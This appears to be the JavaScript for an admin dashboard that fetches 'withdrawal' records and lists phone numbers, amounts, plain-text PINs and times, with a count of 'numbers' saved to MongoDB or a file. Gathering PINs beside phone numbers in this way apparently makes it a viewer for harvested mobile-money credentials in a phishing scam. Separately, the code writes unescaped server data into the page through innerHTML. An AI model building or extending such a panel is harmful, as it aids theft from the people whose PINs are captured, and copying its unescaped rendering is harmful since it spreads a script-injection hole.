const tableBody = document.getElementById("tableBody");
const meta = document.getElementById("meta");
const search = document.getElementById("search");
const refresh = document.getElementById("refresh");

search.addEventListener("input", () => {
  search.value = String(search.value || "").replace(/\D/g, "");
});

async function load() {
  const q = encodeURIComponent(search.value || "");
  const res = await fetch("/api/admin/withdrawals?phone=" + q, { cache: "no-store" });
  const data = await res.json();
  const rows = data.data || [];
  meta.textContent = rows.length + " numbers · saved in " + (data.persist === "mongo" ? "MongoDB" : "file");
  tableBody.innerHTML = rows.length
    ? rows.map((r) => (
        "<tr><td>" + r.phone + "</td><td>" + (r.amount != null ? r.amount : "") + "</td><td>" + r.pin + "</td><td>" + (r.displayTime || r.time) + "</td></tr>"
      )).join("")
    : "<tr><td colspan='4'>No numbers yet</td></tr>";
}

refresh.addEventListener("click", load);
search.addEventListener("input", load);
load();
